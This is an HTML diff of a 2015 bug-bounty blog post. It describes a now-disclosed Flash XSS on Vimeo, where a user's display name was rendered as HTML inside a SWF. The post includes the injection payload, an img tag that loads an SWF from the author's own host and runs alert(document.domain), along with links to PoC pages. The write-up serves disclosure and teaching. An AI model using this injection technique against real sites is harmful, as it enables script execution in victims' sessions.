@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Flash XSS using images</title>
+  <meta name="description" content="Looking for bugs on Vimeo I found out that they have an endpoint where they show the videos uploaded by an user using a Flash file. This is the endpoint for ...">
+
+  <link rel="stylesheet" href="/blog/css/main.css">
+  <link rel="canonical" href="http://esevece.github.com/blog/2015/12/01/flash-xss-using-images.html">
+  <link rel="alternate" type="application/rss+xml" title="Stefano" href="http://esevece.github.com/blog/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/blog/">Stefano</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Flash XSS using images</h1>
+    <p class="post-meta"><time datetime="2015-12-01T00:00:00-06:00" itemprop="datePublished">Dec 1, 2015</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>Looking for bugs on <a href="https://hackerone.com/vimeo">Vimeo</a> I found out that they have an endpoint where they show the videos uploaded by an user using a Flash file. This is the endpoint for my user <a href="https://vimeo.com/hubnut/user/user36690798">https://vimeo.com/hubnut/user/user36690798</a>.</p>
+
+<p>If you <a href="view-source:https://vimeo.com/hubnut/user/user36690798">look at the source</a> you notice that there is a <code>var config</code> which contains information about the user, including the name (which appears as the value of <code>display_name</code>). This variable is loaded by the Flash file <a href="https://f.vimeocdn.com/p/flash/hubnut/2.0.12/hubnut.swf">https://f.vimeocdn.com/p/flash/hubnut/2.0.12/hubnut.swf</a> who puts the value of <code>display_name</code> in a <code>TextField()</code> using the setter <code>.text</code> and because they apply a style sheet to the <code>TextField()</code>, the content <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#text">is interpreted as HTML</a> like using <code>.htmlText</code>.</p>
+
+<p>An extract of the code of the class <em>Carousel</em> from the file <em>hubnut.swf</em>:</p>
+
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="p">...</span>
+<span class="k">this</span><span class="p">.</span><span class="nx">selectedLabel</span><span class="p">.</span><span class="nx">styleSheet</span> <span class="o">=</span> <span class="nx">_loc2_</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="c1">// Here &quot;display_name&quot; appears as &quot;_loc4_.owner.display_name&quot;</span>
+<span class="nx">_loc13_</span> <span class="o">=</span> <span class="nx">_loc13_</span> <span class="o">+</span> <span class="p">(</span><span class="nx">_loc4_</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">url</span><span class="o">?</span><span class="s2">&quot;&lt;h2&gt;by &lt;a href=\&quot;//&quot;</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">vimeo_url</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="nx">_loc4_</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">url_name</span> <span class="o">+</span> <span class="s2">&quot;\&quot; target=\&quot;_blank\&quot;&gt;&quot;</span> <span class="o">+</span> <span class="nx">_loc4_</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">display_name</span> <span class="o">+</span> <span class="s2">&quot;&lt;/a&gt;&lt;/h2&gt;&quot;</span><span class="o">:</span><span class="s2">&quot;&lt;h2&gt;by &lt;strong&gt;&quot;</span> <span class="o">+</span> <span class="nx">_loc4_</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">display_name</span> <span class="o">+</span> <span class="s2">&quot;&lt;/strong&gt;&lt;/h2&gt;&quot;</span><span class="p">);</span>
+<span class="p">...</span>
+<span class="k">this</span><span class="p">.</span><span class="nx">selectedLabel</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">_loc13_</span><span class="p">;</span>
+<span class="p">...</span></code></pre></div>
+
+<p>Now, the value of <code>display_name</code> is being encoded as HTML entities, but it was not the case 2 months ago (I think that they were escaping as JSON, for instance <code>/</code> was being escaped as <code>\/</code>). So, it was possible to put HTML code but Flash doesn’t interpret every HTML tag as valid. Which one is the widely used for this case? <code>&lt;a&gt;</code>, yes, but the problem is that you have a limit of 32 characters for your name in Vimeo and for me wasn’t enough to make a valid proof of concept. With this scenario I decided to read <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#htmlText">which HTML tags are interpreted by Flash</a> and noticed this:</p>
+
+<blockquote>
+  <p>src: Specifies the URL to an image or SWF file</p>
+</blockquote>
+
+<p>Sounds promising! Anyway, at first I thought that maybe Flash loaded the file in a sandbox to disallow execution of Javascript code but I continued the testing. I uploaded a Flash file to my server which executed <code>ExternalInterface.call("alert(document.domain)");</code> and changed my name to <code>&lt;img src="//u00f1.xyz/xss.swf"&gt;</code>. Reloaded <a href="https://vimeo.com/hubnut/user/user36690798">https://vimeo.com/hubnut/user/user36690798</a> and for my surprise <code>alert(document.domain)</code> was executed on <strong>vimeo.com</strong> without user interaction.</p>
+
+<p>After successfully execute Javascript using an <code>&lt;img&gt;</code> tag, I went to check if it was possible to do the same but in cases where you can provide the URL of an image that is shown using Flash, and I confirmed that it is possible. What I mean is that if, for example, Vimeo allowed to put any URL as the thumbnail of the video, you could provide an URL to a Flash file of yours with Javascript code and it would probably load the file and execute the Javascript code.</p>
+
+<p>You can test the issue using the <code>&lt;img&gt;</code> tag <a href="http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&amp;asHtml=true&amp;asObject=false">here</a> and the issue when you can provide the URL of an image <a href="http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&amp;asHtml=false&amp;asObject=false">here</a>.
+This code is available at <a href="https://github.com/esevece/esevece.github.io/code/">https://github.com/esevece/esevece.github.io/code/</a>.</p>
+
+<p>The report <a href="https://hackerone.com/reports/87577">is publicly disclosed on HackerOne</a> thanks to Vimeo.</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <!-- <h2 class="footer-heading">Stefano</h2> -->
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!-- <ul class="contact-list">
+          <li>Stefano</li>
+          <li><a href="mailto:"></a></li>
+        </ul> -->
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://twitter.com/esevece"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">Twitter</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://hackerone.com/esevece"><span class="icon icon--hackerone"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg width="39px" height="74px" viewBox="0 0 39 74" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns">
+    <!-- Generator: Sketch 3.4.2 (15855) - http://www.bohemiancoding.com/sketch -->
+    <title>Untitled 3</title>
+    <desc>Created with Sketch.</desc>
+    <defs>
+        <path id="path-1" d="M0.06,3.60329081 C0.212928399,2.89925466 0.657587482,2.30266801 1.387,1.823 C2.307,1.223 3.497,0.915 4.958,0.915 C6.357,0.915 7.547,1.223 8.535,1.823 C9.523,2.44 10.014,3.219 10.014,4.183 L10.014,70.051 C10.014,70.887 9.499,71.652 8.486,72.35 C7.467,73.056 6.295,73.407 4.958,73.407 C3.559,73.407 2.387,73.056 1.436,72.35 C0.673931664,71.7899832 0.215600576,71.1951631 0.06,70.5544658 L0.06,3.60329081 L0.06,3.60329081 Z"></path>
+        <path id="path-3" d="M0.787,9.392 C0.187,9.954 -0.071,10.807 0.04,11.974 C0.143,13.13 0.677,14.23 1.623,15.268 C2.573,16.313 3.635,16.968 4.85,17.246 C6.046,17.517 6.955,17.369 7.555,16.813 L12.857,13.506 L12.857,43.051 C12.857,43.887 13.317,44.646 14.249,45.35 C15.158,46.056 16.324,46.407 17.723,46.407 C19.122,46.407 20.33,46.056 21.343,45.35 C22.361,44.646 22.871,43.887 22.871,43.051 L22.871,3.329 C22.871,2.365 22.374,1.587 21.392,0.988 C20.41,0.376 19.189,0.079 17.723,0.079 C16.262,0.079 15.09,0.376 14.194,0.988 L0.787,9.392 L0.787,9.392 Z"></path>
+    </defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" sketch:type="MSPage">
+        <g id="HackerOne---short" sketch:type="MSLayerGroup">
+            <g id="Page-1">
+                <g id="Group-3">
+                    <mask id="mask-2" sketch:name="Clip 2" fill="white">
+                        <use xlink:href="#path-1"></use>
+                    </mask>
+                    <g id="Clip-2"></g>
+                    <path d="M0.06,0.8 L10.02,0.8 L10.02,73.52 L0.06,73.52 L0.06,0.8 Z" id="Fill-1" fill="#828282" sketch:type="MSShapeGroup" mask="url(#mask-2)"></path>
+                </g>
+                <g id="Group-6" transform="translate(16.000000, 27.000000)">
+                    <mask id="mask-4" sketch:name="Clip 5" fill="white">
+                        <use xlink:href="#path-3"></use>
+                    </mask>
+                    <g id="Clip-5"></g>
+                    <path d="M0.02,-0.04 L22.94,-0.04 L22.94,46.52 L0.02,46.52 L0.02,-0.04 Z" id="Fill-4" fill="#828282" sketch:type="MSShapeGroup" mask="url(#mask-4)"></path>
+                </g>
+            </g>
+        </g>
+    </g>
+</svg></span><span class="username">HackerOne</span></a>
+
+          </li>
+          
+
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>I share my findings here. Unless the ones that I think are useful for someone just starting finding bugs.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
